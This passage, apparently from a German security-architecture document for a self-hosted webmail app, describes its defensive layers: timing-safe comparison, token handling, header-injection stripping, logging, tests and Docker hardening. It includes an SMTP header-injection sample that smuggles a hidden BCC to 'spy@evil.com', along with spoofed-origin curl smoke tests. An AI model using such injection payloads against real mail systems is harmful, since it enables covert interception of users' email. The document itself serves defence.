Ein normaler String-Vergleich (`===`) bricht beim ersten unterschiedlichen Zeichen ab. Ein Angreifer kann die Antwortzeit messen und zeichenweise erraten:
- Token `a...` → 0.1ms (erstes Zeichen falsch, sofort Return)
- Token `x...` → 0.2ms (erstes Zeichen richtig, zweites geprüft)
- Durch viele Messungen: Token zeichenweise rekonstruierbar

```javascript
// src/server/index.js – NICHT: if (token === sessionToken)
// SONDERN:
function timingSafeCompare(a, b) {
  const bufA = Buffer.from(a, 'utf-8');
  const bufB = Buffer.from(b, 'utf-8');
  if (bufA.length !== bufB.length) {
    // Trotzdem konstante Zeit: Dummy-Vergleich
    crypto.timingSafeEqual(bufA, bufA);
    return false;
  }
  return crypto.timingSafeEqual(bufA, bufB);
}
```

**Wo angewendet:**
- CSRF-Token-Validierung (`X-CSRF-Token` vs. `session.csrfToken`)

**Warum der Längen-Check?** `crypto.timingSafeEqual()` wirft bei unterschiedlichen Buffer-Längen einen Error. Deshalb: Dummy-Vergleich, dann `false` – gleiche Laufzeit wie ein echter Vergleich.

### Attachment-Token Memory-Management

```javascript
// src/server/index.js
const MAX_TOKENS = 10_000;  // Max 10k Tokens (~2MB RAM)

function createAttachmentToken(folder, uid, index) {
  // Bei Überlauf: Ältestes Token entfernen (FIFO)
  if (attachmentTokens.size >= MAX_TOKENS) {
    const oldest = attachmentTokens.keys().next().value;
    attachmentTokens.delete(oldest);
    securityLog.info('TOKEN_EVICTION', 'Token-Store voll, ältestes entfernt');
  }
  // ...
}

// Sweep alle 60 Sekunden: Abgelaufene Tokens entfernen
setInterval(() => {
  for (const [token, entry] of attachmentTokens) {
    if (Date.now() > entry.expires) attachmentTokens.delete(token);
  }
}, 60_000);
```

| Schutzmechanismus | Wert |
|---|---|
| TTL pro Token | 10 Minuten |
| Einmal-Nutzung | Ja (sofort gelöscht) |
| Max-Anzahl | 10'000 Tokens |
| Sweep-Intervall | 60 Sekunden |
| Eviction-Strategie | FIFO (ältestes zuerst) |

---

## 12. Schicht 11 – Protokoll-Injection

### SMTP Header Injection

**Angriffsszenario:**

```
Betreff: Hallo\r\nBCC: spy@evil.com
```

Ohne Sanitization wird `\r\n` als SMTP-Zeilenumbruch interpretiert. Der Server fügt einen unsichtbaren BCC-Empfänger ein – jede gesendete Mail geht auch an den Angreifer.

**Schutz:**

```javascript
// src/server/index.js
function stripHeaderInjection(str) {
  return str.replace(/[\r\n\x00]/g, '').trim();
}

// Angewendet auf ALLE Header-fähigen Felder:
const safeTo      = stripHeaderInjection(sanitizeString(to, 2000));
const safeCc      = stripHeaderInjection(sanitizeString(cc, 2000));
const safeBcc     = stripHeaderInjection(sanitizeString(bcc, 2000));
const safeSubject = stripHeaderInjection(sanitizeString(subject, 500));
const safeReplyTo = stripHeaderInjection(sanitizeString(inReplyTo, 500));
const safeRefs    = stripHeaderInjection(sanitizeString(references, 2000));
```

| Entferntes Zeichen | Code | Risiko |
|---|---|---|
| Carriage Return | `\r` (0x0D) | SMTP-Header-Trennung |
| Line Feed | `\n` (0x0A) | SMTP-Header-Trennung |
| Null Byte | `\x00` | Parser-Verwirrung |

**Doppelter Schutz:** Nodemailer validiert ebenfalls, aber Defense-in-Depth: Unsere eigene Prüfung greift **vor** der Übergabe an Nodemailer.

---

## 13. Schicht 12 – Prozess-Sicherheit

### Secure Shutdown

```javascript
// src/server/index.js
async function secureShutdown(signal) {
  securityLog.info('SHUTDOWN', `${signal} – Secure Shutdown`);

  // 1. Attachment-Tokens löschen
  attachmentTokens.clear();

  // 2. IMAP sauber trennen
  if (imapClient?.connected) await imapClient.disconnect();
  imapClient = null;

  // 3. SMTP sauber trennen
  if (smtpClient) await smtpClient.disconnect();
  smtpClient = null;

  // 4. Credentials nullen
  currentUser = null;

  process.exit(0);
}

process.on('SIGINT',  () => secureShutdown('SIGINT'));
process.on('SIGTERM', () => secureShutdown('SIGTERM'));
```

| Schritt | Aktion | Grund |
|---|---|---|
| 1 | `attachmentTokens.clear()` | Keine gültigen Download-URLs nach Restart |
| 2 | IMAP disconnect | Saubere IMAP-LOGOUT-Sequenz, Server gibt Mailbox frei |
| 3 | SMTP disconnect | SMTP QUIT, TCP-Socket geschlossen |
| 4 | `currentUser = null` | Credentials aus JS-Heap (soweit GC-kontrollierbar) |

**Hinweis:** JavaScript/V8 kann nicht garantieren, dass Strings sofort aus dem RAM gelöscht werden (GC-Timing). Für Hochsicherheits-Umgebungen: Buffer statt Strings für Passwörter + explizites `.fill(0)`.

### Unerwartete Fehler

```javascript
process.on('uncaughtException', (err) => {
  securityLog.info('UNCAUGHT_EXCEPTION', err.message);
  // Server läuft weiter, aber Event ist geloggt
});

process.on('unhandledRejection', (reason) => {
  securityLog.info('UNHANDLED_REJECTION', String(reason));
});
```

Der Server stürzt nicht bei einem einzelnen Fehler ab, aber jeder Vorfall wird geloggt.

---

## 14. Schicht 13 – Logging, Audit & Supply-Chain

### Strukturierte Security-Logs

Alle sicherheitsrelevanten Events werden strukturiert als JSON in Tages-Logdateien geschrieben:

```
logs/security-2026-03-12.log
```

```json
{"timestamp":"2026-03-12T18:30:00.000Z","level":"WARN","event":"LOGIN_FAILED","user":"m***h@example.com","ip":"::1","detail":"Invalid credentials"}
{"timestamp":"2026-03-12T18:31:00.000Z","level":"ALERT","event":"CSRF_VIOLATION","ip":"::1","origin":"https://evil.com","path":"/api/send"}
```

#### Geloggte Events

| Event | Level | Trigger |
|---|---|---|
| `LOGIN_SUCCESS` | INFO | Erfolgreicher Login |
| `LOGIN_FAILED` | WARN | Fehlgeschlagener Login |
| `LOGOUT` | INFO | Expliziter Logout |
| `SESSION_EXPIRED` | INFO | Auto-Logout nach 30min |
| `UNAUTHORIZED_ACCESS` | WARN | API-Zugriff ohne aktive Session |
| `CSRF_VIOLATION` | ALERT | Request von fremdem Origin |
| `RATE_LIMIT_HIT` | WARN | Rate-Limit-Überschreitung |
| `INVALID_ATTACHMENT_TOKEN` | WARN | Ungültiger/abgelaufener Download-Token |
| `SSRF_ATTEMPT` | ALERT | Versuch, interne Adresse zu kontaktieren |
| `DANGEROUS_ATTACHMENT` | WARN | Gefährlicher Dateityp in eingehender Mail |
| `SECURITY_WARNING` | WARN | Punycode/Homograph in Absender |

### Redaction sensibler Daten

```javascript
// src/server/security-logger.js
const REDACT_KEYS = ['pass', 'password', 'accessToken', 'token', 'secret', 'authorization', 'cookie'];
```

| Eingabe | Log-Ausgabe |
|---|---|
| `user@example.com` | `u**r@example.com` |
| `password: "geheim123"` | `password: "[REDACTED]"` |
| `accessToken: "ya29.xxx"` | `accessToken: "[REDACTED]"` |
| `cookie: "sid=abc"` | `cookie: "[REDACTED]"` |

**E-Mail-Adressen** werden maskiert (erster und letzter Buchstabe des Local-Parts sichtbar). **Passwörter, Tokens, Secrets** werden durch `[REDACTED]` ersetzt.

### Log-Retention

```javascript
const LOG_RETENTION_DAYS = 30;
// Tägliche Bereinigung: Logs älter als 30 Tage werden gelöscht
cleanOldLogs();
setInterval(cleanOldLogs, 86400000);
```

**Verhalten:**
- Logs werden als Tages-Dateien angelegt (`security-YYYY-MM-DD.log`)
- Dateien älter als 30 Tage werden automatisch gelöscht
- Verzeichnis `logs/` ist in `.gitignore`

### Console-Ausgabe

Sicherheitsevents werden farbcodiert auf der Console ausgegeben:

```
[SECURITY:INFO]  LOGIN_SUCCESS – 
[SECURITY:WARN]  RATE_LIMIT_HIT – 
[SECURITY:ALERT] CSRF_VIOLATION – Request von fremdem Origin blockiert
```

### Dependency-Scanning & Supply-Chain-Hygiene

#### Automatischer Audit

```bash
npm run security:audit   # → npm audit
```

#### Kritische Dependencies

| Paket | Risiko | Massnahme |
|---|---|---|
| `dompurify` | XSS-Bypass bei Bugs | Regelmässig updaten, Release-Notes prüfen |
| `imapflow` | IMAP-Injection | Input wird vorher validiert |
| `nodemailer` | SMTP-Injection | Adressen einzeln validiert |
| `jsdom` | DOM-Parser-Bugs | Nur serverseitig, nie im Client |
| `express` | Middleware-Bypasses | Security-Advisories beobachten |
| `helmet` | Header-Konfiguration | Neue Defaults bei Updates prüfen |

#### Empfohlener Update-Zyklus

| Frequenz | Aktion |
|---|---|
| Wöchentlich | `npm audit` ausführen |
| Monatlich | `npm outdated` prüfen, Patch-Updates einspielen |
| Quartalsweise | Major-Updates evaluieren (Breaking Changes) |
| Bei CVE-Alert | Sofort patchen |

#### Lockfile-Integrität

```bash
npm ci          # Statt npm install – respektiert package-lock.json exakt
npm audit fix   # Automatische Patch-Updates
```

---

## 15. Schicht 14 – Automatisierte Tests

### Test-Suite

```bash
npm run security:test    # 94 automatisierte Security-Assertions
npm run security:audit   # npm audit für Dependency-Schwachstellen
```

Die Tests decken 10 Kategorien ab:

| Kategorie | Tests | Prüft |
|---|---|---|
| HTML Sanitization | 13 | XSS-Vektoren (script, iframe, event-handler, ...) |
| CSS Exfiltration | 7 | url(), expression(), var(), @import, ... |
| Unicode & Punycode | 8 | BOM, RTL-Override, Homograph-Domains |
| Link Security | 3 | noopener, noreferrer, target=_blank |
| Tracking Pixel | 1 | 1×1 Pixel Erkennung |
| Attachment Security | 19 | Dateitypen, MIME-Mismatch, Doppel-Extensions |
| Timing-Safe Compare | 6 | crypto.timingSafeEqual Wrapper |
| SMTP Header Injection | 6 | CRLF, LF, CR, Null-Byte Stripping |
| Input Validation | 15 | E-Mail, Host, Folder, UID |
| ReDoS Protection | 10 | Alle Regex gegen 100k-Zeichen-Input |

### CI-Integration

```yaml
# .github/workflows/security.yml
name: Security
on: [push, pull_request]
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with: { node-version: 20 }
      - run: npm ci
      - run: npm run security:test
      - run: npm audit --audit-level=high
```

### ReDoS-Audit

Alle 10 sicherheitskritischen Regex-Patterns werden automatisch gegen pathologische 100'000-Zeichen-Eingaben getestet. Keines darf > 100ms brauchen.

```
Regex "Email"          – 0.1ms ✅
Regex "Host"           – 0.0ms ✅
Regex "CSS url"        – 0.0ms ✅
Regex "CSS expression" – 0.0ms ✅
Regex "CSS var"        – 0.1ms ✅
...
```

**Empfehlung:** Vierteljährlich mit `npx safe-regex-cli` alle Patterns prüfen, besonders nach Änderungen.

---

## 16. Konfiguration

### `.env.local` (Nicht im Repository)

```bash
# Server-Verbindung (nur Host/Port, keine Credentials)
IMAP_HOST=mail.example.com
IMAP_PORT=993
SMTP_HOST=mail.example.com
SMTP_PORT=465

# TLS-Zertifikatsprüfung
# true  = Strikt (Produktion)
# false = Ignorieren (Entwicklung, selbst-signierte Zertifikate)
TLS_REJECT_UNAUTHORIZED=true
```

### `config/default.json`

Enthält nur nicht-sensitive Konfiguration:
- Erlaubte/verbotene HTML-Tags
- Standard-Abrufanzahl
- Server-Port
- Bild-Blockierung ein/aus

### Sicherheitsrelevante Dateien

| Datei | Verantwortung |
|---|---|
| `src/server/sanitizer.js` | HTML-Sanitization, CSS-Filter, Punycode, BOM-Schutz |
| `src/server/mime-parser.js` | MIME-Parsing mit Limits, Dateinamen-Sanitization |
| `src/server/index.js` | Helmet, Rate Limiting, Input-Validierung, Token-System, SSRF-Schutz |
| `src/server/imap-client.js` | TLS-Konfiguration, sichere IMAP-Kommunikation |
| `src/server/smtp-client.js` | TLS-Konfiguration, sichere SMTP-Kommunikation |

---

### Neue Dateien

| Datei | Verantwortung |
|---|---|
| `src/server/security-logger.js` | Strukturierte Sicherheits-Logs, Redaction, Retention |
| `src/server/attachment-security.js` | Dateityp-Analyse, MIME-Validation, Risikobewertung |

---

## 17. Deployment auf öffentlichen Servern

> **Ausführliche Dokumentation: [`DEPLOYMENT.md`](DEPLOYMENT.md)**

Beim Wechsel von localhost auf einen öffentlich erreichbaren Server (z.B. Hetzner) ändert sich das Bedrohungsmodell fundamental. Die wichtigsten Unterschiede:

| Aspekt | localhost | Production |
|---|---|---|
| HTTPS | Optional | **Pflicht** |
| Multi-User | Nein | **Ja** – isolierte IMAP/SMTP pro Session |
| Session-Store | RAM | **Redis** |
| Auth-Layer | Keiner | **HTTP Basic / Authelia** |
| Rate Limiting | Per `req.ip` | Per `X-Forwarded-For` + Nginx |
| CSP | `unsafe-inline` | **Nonce-basiert** |
| DoS-Schutz | Irrelevant | **Nginx + Fail2ban** |
| Attachment-Tokens | Global | **Session-gebunden** |

Der Code erkennt `NODE_ENV=production` automatisch und aktiviert:
- `secure: true` auf Session-Cookies
- Nonce-basierte CSP statt `unsafe-inline`
- Strengere Rate Limits (5 Login-Versuche statt 10)
- `APP_DOMAIN` im Host-Header-Check
- `trust proxy` für korrekte Client-IP hinter Nginx

---

## 18. Schicht 15 – Container-Sicherheit (Docker)

### Non-Root Execution

Die Applikation läuft im Docker-Container **nicht als root**:

```dockerfile
RUN addgroup -S mailapp && adduser -S mailapp -G mailapp
# ...
CMD ["su-exec", "mailapp", "node", "src/server/index.js"]
```

- **Dedizierter System-User** `mailapp` ohne Login-Shell
- **`su-exec`** statt `sudo` (kein SUID-Binary nötig)
- Selbst bei einer RCE-Schwachstelle hat der Angreifer nur eingeschränkte Rechte

### Minimal Base Image

```dockerfile
FROM node:20-alpine
```

- **Alpine Linux**: ~5 MB Base-Image statt ~900 MB (Debian)
- Keine unnötigen Pakete (kein `curl`, `wget`, `gcc`, `make`, etc.)
- Kleinere Angriffsfläche: weniger CVEs, weniger Binaries für Exploitation

### Build-Hygiene

```dockerfile
RUN npm ci --omit=dev && npm cache clean --force
```

- **`npm ci`**: Reproduzierbare Builds aus `package-lock.json`
- **`--omit=dev`**: Keine Dev-Dependencies im Production-Image
- **Cache gelöscht**: Kein npm-Cache im finalen Image

### Env-Var Isolation

Sensible Variablen (`SESSION_SECRET`, Credentials) werden **nicht** im Image gebacken:
- Injection zur **Laufzeit** über Coolify/Docker-Environment
- Kein `ENV SESSION_SECRET=...` im Dockerfile
- `.env.local` in `.dockerignore` → wird nie ins Image kopiert

### Redis Connect-Timeout

Falls Redis nicht erreichbar ist, blockiert die App **nicht**:

```javascript
const timeoutPromise = new Promise((_, reject) =>
  setTimeout(() => reject(new Error('Redis connect timeout (5s)')), 5000)
);
await Promise.race([connectPromise, timeoutPromise]);
```

- **5-Sekunden-Timeout** für Redis-Verbindung
- **Automatischer Fallback** auf MemoryStore
- **Reconnect-Strategie**: Max 3 Versuche, dann aufgeben

### Healthcheck

```dockerfile
HEALTHCHECK --interval=30s --timeout=5s --start-period=20s --retries=3 \
  CMD wget -qO- http://localhost:3000/api/config || exit 1
```

- Docker/Coolify erkennt automatisch wenn die App nicht mehr antwortet
- Container wird nach 3 fehlgeschlagenen Checks als `unhealthy` markiert
- Orchestrator kann automatisch neustarten

---

## 19. Schicht 16 – Host-Header-Erweiterung

### EXTRA_HOSTS

Für Deployment-Szenarien mit dynamischen Domains (z.B. Coolify sslip.io):

```
EXTRA_HOSTS=staging.example.com,test.78.46.189.129.sslip.io
```

- Komma-separierte Liste zusätzlicher erlaubter Host-Header
- Ergänzt die automatische Whitelist (`localhost`, `APP_DOMAIN`)
- Nützlich für Staging/Testing ohne den DNS-Rebinding-Schutz zu schwächen

---

## 20. Bekannte Einschränkungen

| Einschränkung | Risiko | Empfehlung |
|---|---|---|
| Kein HTTPS auf localhost | Niedrig (nur lokaler Zugriff) | Reverse-Proxy mit Let's Encrypt (Coolify/Traefik) |
| MemoryStore ohne Redis | Niedrig | Sessions gehen bei Restart verloren; Redis für Persistenz |
| Passwort im RAM | Niedrig | Bei Bedarf: Verschlüsselter Keyring oder Vault-Integration |
| `TLS_REJECT_UNAUTHORIZED=false` | Mittel | Nur für Entwicklung/spezifische Provider, in Produktion `true` |
| Kein S/MIME oder PGP | Mittel | Ende-zu-Ende-Verschlüsselung nicht implementiert |
| OAuth2 nur vorbereitet | Niedrig | Token-Beschaffung (OAuth-Flow) muss extern erfolgen |
| Rate-Limit-Bypass hinter Proxy | Mittel | `trust proxy` konfigurieren + `X-Forwarded-For` überschreiben |
| V8 GC: Passwörter im RAM | Niedrig | Buffer + `.fill(0)` statt Strings für Hochsicherheit |
| Kein Virenscan für Anhänge | Mittel | ClamAV-Integration oder externer Scan-Service empfohlen |
| Logs nicht verschlüsselt | Niedrig | Bei sensiblen Umgebungen: Log-Verschlüsselung oder SIEM |

---

## Testprotokoll

```bash
# Vollständige Security-Test-Suite (94 Tests)
npm run security:test

# Dependency-Audit
npm run security:audit

# Manueller Smoke-Test: DNS Rebinding
curl -H "Host: evil.com" http://127.0.0.1:3000/api/config
# → 403 "Ungültiger Host-Header"

# Manueller Smoke-Test: CSRF
curl -X POST -H "Origin: https://evil.com" http://localhost:3000/api/send
# → 403 "Zugriff verweigert (CSRF-Schutz)"

# Manueller Smoke-Test: Permissions-Policy
curl -sI http://localhost:3000/ | grep Permissions-Policy
# → camera=(), microphone=(), geolocation=(), ...
```
